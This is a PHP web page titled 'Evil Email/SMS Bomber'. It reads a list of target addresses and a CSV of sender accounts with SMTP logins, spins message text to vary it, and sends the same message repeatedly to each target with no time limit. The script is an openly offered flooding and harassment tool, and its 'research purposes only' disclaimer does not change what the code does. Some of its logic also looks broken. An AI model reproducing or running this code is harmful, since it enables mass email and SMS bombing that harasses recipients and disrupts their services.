<!DOCTYPE html>
<html lang="en">
<head>
<title>Evil Email/SMS Bomber</title>
<meta name="description" content="Evil Email/SMS Bomber">
<meta name="author" content="https://www.facebook.com/AnonymousLegionForJustice">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
<style type="text/css">
body {
    background-color: black;
}

.errorlabel {
    font-weight:900; 
    color:#ffffff;
    font-family: Arial Black, Gadget, sans-serif;
    }
.error_email_label {
    font-weight:900; 
    color:#FF69B4;
    font-family: Arial Black, Gadget, sans-serif;

}
.error_smtp_server{
  font-weight:900; 
    color:#00FF00;
    font-family: Arial Black, Gadget, sans-serif;
}
.error {
    font-weight:900; 
    color:#ff0000;
    font-family: Arial Black, Gadget, sans-serif;
}

#success {
      font-weight:900; 
    color:#ffffff;
    font-family: Arial Black, Gadget, sans-serif;
    }
    
.from_email {
      font-weight:900; 
    color:#ffff00;
    font-family: Arial Black, Gadget, sans-serif;
    }    
    
.sent_number{
      font-weight:900; 
    color:#ff0000;
    font-family: Arial Black, Gadget, sans-serif;
    }    


.target_email{
      font-weight:900; 
    color:#ffa500;
    font-family: Arial Black, Gadget, sans-serif;
    } 

</style>


<body>
<img src="images/logo.png" alt="Logo" style="width:100%;height:19em;float:left;margin-top:0.4em;margin-left:1.4em;padding:2em;">
 <br>
<?php
include('class/Mail.php');
error_reporting(0);
ini_set('max_execution_time', 259200);
set_time_limit(0);
ob_implicit_flush(true);

// BY PHP NINJA JEFF CHILDERS
// for RESEARCH PURPOSES ONLY

// Proxy Option Coming Soon


ob_start();

// spin2win - nested spinning. format: this {cup|bowl|plate} is {really {tall.|oddly shaped.}|cool.}
function spin2win($s) {
        preg_match('#{(.+?)}#is',$s,$m);
        if(empty($m)) return $s;

        $t = $m[1];

        if(strpos($t,'{')!==false){
                $t = substr($t, strrpos($t,'{') + 1);
        }

        $parts = explode("|", $t);
        $s = preg_replace("+{".preg_quote($t)."}+is", $parts[array_rand($parts)], $s, 1);

        return spin2win($s);
}

   // file with the emails. one email per line.
$targetemails_handle = fopen("target_emails.txt", "r");

while (!feof($targetemails_handle) ) {

$targets = fgets($targetemails_handle, 4096);
$emailtargets = explode('\n', $targets);

 
// sendEmails - pulls emails from a list,
$file_handle = fopen("emails_to_send_from.csv", "r");

while (!feof($file_handle) ) {

$line_of_text = fgetcsv($file_handle, 4096);
$colum_0 = explode(',', $line_of_text[0]);
$colum_1 = explode(',', $line_of_text[1]);
$colum_2 = explode(',', $line_of_text[2]);
$colum_3 = explode(',', $line_of_text[3]);
$colum_4 = explode(',', $line_of_text[4]);




foreach ($colum_0 as $Column_zero ) {
foreach ($colum_1 as $Column_one)   {
foreach ($colum_2 as $Column_two)   {
foreach ($colum_3 as $Column_three) {
foreach ($colum_4 as $Column_four ) {


$From_Email = "$Column_zero";
$smtp_login = "$Column_one";
$smtp_password = "$Column_two";
$smtp_server_info = "$Column_three";
$smtp_port = "$Column_four";

$number = 0; 
foreach ($emailtargets as $emailtarget) {
// Varables From CSV Data

$from = "$From_Email";
$to = "$emailtarget";
$username = "$smtp_login";
$password = "$smtp_password";
$host = "$smtp_server_info";
$port = "$smtp_port";


// Start Emailing/SMS


$emailtitle = $_POST['subject'];
$emailmessage = $_POST['message'];
$subject = spin2win($emailtitle);
$body = spin2win($emailmessage);

// Email Headers
$headers = array ('From' => $from,
'To' => $to,
'Subject' => $subject);
$smtp = Mail::factory('smtp',
array ('host' => $host,
'port' => $port,
'auth' => true,
'username' => $username,
'password' => $password));


    

$sendtimes = $_POST['sendtimes'];



}
}
}
} 
}
} 




while ($number < $sendtimes) {
$number++;


$mail = $smtp->send($to, $headers, $body);
sleep(2);
}


if (PEAR::isError($mail)) {

echo nl2br('     \n   <br> <span class="errorlabel">ERROR:</span> <span class="error_email_label">'. $From_Email  .'</span><span class="error_smtp_server"> ('. $smtp_server_info  .')</span>   <span class="error">' . $mail->getMessage() . '    </span>     \n      <br>  ');
  
  } else {
   
echo nl2br('     \n     <div id="success">     From:  <span class="from_email">'. $Column_one . '</span>  Sent <span class="sent_number">'. $sendtimes .'</span>  times to <span class="target_email">'. $emailtarget . '</span>      </div>    \n       ');
  }
   
}  
   
}
ob_flush();
flush();
ob_end_clean();


// BY PHP NINJA JEFF CHILDERS
// for RESEARCH PURPOSES ONLY

?>

</body>
   </html>
